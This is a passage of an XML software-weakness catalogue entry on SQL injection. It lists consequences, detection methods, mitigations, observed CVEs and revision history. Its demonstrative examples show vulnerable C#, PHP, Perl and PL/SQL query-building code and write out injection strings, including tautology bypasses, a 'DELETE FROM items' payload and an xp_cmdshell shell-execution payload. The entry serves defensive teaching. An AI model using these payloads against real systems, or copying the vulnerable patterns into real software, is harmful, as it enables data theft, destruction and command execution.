            <xhtml:p>SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Database Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness typically appears in data-rich applications that save user inputs in a database.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method>Manual Analysis</Method>
               <Description>Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using "exec" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>
                  <xhtml:p>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</xhtml:p>
                  <xhtml:p>Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</xhtml:p>
                  <xhtml:p>Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing SQL query strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name "O'Reilly" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.</xhtml:p>
                  <xhtml:p>When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.</xhtml:p>
                  <xhtml:p>If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.</xhtml:p>
                  <xhtml:p>In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>string userName = ctx.getAuthenticatedUserName();<xhtml:br/>string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>DataTable dt = new DataTable();<xhtml:br/>sda.Fill(dt);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The query that this code intends to execute follows:</Body_Text>
               <Example_Code Nature="informative">
                  <xhtml:div>SELECT * FROM items WHERE owner = &lt;userName&gt; AND itemname = &lt;itemName&gt;;</xhtml:div>
               </Example_Code>
               <Body_Text>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name' OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>The addition of the:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items;</xhtml:div>
               </Example_Code>
               <Body_Text>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.</Intro_Text>
               <Body_Text>If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name'; DELETE FROM items; --</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following two queries:</Body_Text>
               <Example_Code Nature="attack" Language="SQL">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:div>
                        <xhtml:i>--'</xhtml:i>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.</Body_Text>
               <Body_Text>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.</Body_Text>
               <Body_Text>If an attacker enters the string</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>Then the following three valid statements will be created:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>SELECT * FROM items WHERE 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>Target fields that are not quoted</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Find ways to bypass the need for certain escaped meta-characters</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Use stored procedures to hide the injected meta-characters.</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
               <Body_Text>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.</Body_Text>
               <Body_Text>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)<xhtml:br/>is open itm_cv for<xhtml:br/>' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';<xhtml:br/>end get_item;</xhtml:div>
               </Example_Code>
               <Body_Text>Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:</Intro_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Where $user_input is taken from an untrusted source.</Body_Text>
               <Body_Text>If the user provides the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>'; exec master..xp_cmdshell 'dir' --</xhtml:div>
               </Example_Code>
               <Body_Text>The query will take the following form:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Now, this query can be broken down into:</Body_Text>
               <Body_Text>
                  <xhtml:ol>
                     <xhtml:li>
                        <xhtml:div>a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>an MS SQL comment: --' ORDER BY PRICE</xhtml:div>
                     </xhtml:li>
                  </xhtml:ol>
               </Body_Text>
               <Body_Text>As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code intends to print a message summary given the message ID.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$id = $_COOKIE["mid"];<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.</Body_Text>
               <Body_Text>While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>1432' or '1' = '1</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the resulting query:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'</xhtml:div>
               </Example_Code>
               <Body_Text>Not only will this retrieve message number 1432, it will retrieve all other messages.</Body_Text>
               <Body_Text>In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:</Body_Text>
               <Example_Code Nature="good" Language="PHP">
                  <xhtml:div>$id = intval($_COOKIE["mid"]);<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example attempts to take a last name provided by a user and enter it into a database.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>$userKey = getUserID();<xhtml:br/>$name = getUserInput();<xhtml:div>
                        <xhtml:i># ensure only letters, hyphens and apostrophe are allowed</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>$name = whiteList($name, "^a-zA-z'-$");<xhtml:br/>$query = "INSERT INTO last_names VALUES('$userKey', '$name')";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer applies a whitelist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens which are used as comment structures in SQL. If a user specifies -- then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the whitelist permits the apostrophe which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-0366</Reference>
               <Description>chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0366</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2790</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2790</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2223</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2223</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6602</Reference>
               <Description>SQL injection via user name.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6602</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5817</Reference>
               <Description>SQL injection via user name or password fields.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5817</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0377</Reference>
               <Description>SQL injection in security product, using a crafted group name.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0377</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2380</Reference>
               <Description>SQL injection in authentication library.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2380</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-11508</Reference>
               <Description>SQL injection in vulnerability management and reporting tool, using a crafted password.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11508</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>19</Entry_ID>
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="109"/>
            <Related_Attack_Pattern CAPEC_ID="110"/>
            <Related_Attack_Pattern CAPEC_ID="470"/>
            <Related_Attack_Pattern CAPEC_ID="66"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 1: SQL Injection.&#34; Page 3"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 12, &#34;Database Input Issues&#34; Page&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;397"/>
            <Reference External_Reference_ID="REF-867"/>
            <Reference External_Reference_ID="REF-868"/>
            <Reference External_Reference_ID="REF-869"/>
            <Reference External_Reference_ID="REF-870"/>
            <Reference External_Reference_ID="REF-871"/>
            <Reference External_Reference_ID="REF-872"/>
            <Reference External_Reference_ID="REF-873"/>
            <Reference External_Reference_ID="REF-874"/>
            <Reference External_Reference_ID="REF-875"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;SQL Queries&#34;, Page 431."/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;SQL Injection&#34;, Page 1061."/>
         </References>
         <Notes>
            <Note Type="Relationship">SQL injection can be resultant from special character mismanagement, MAID, or blacklist/whitelist problems. It can be primary to authentication errors.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
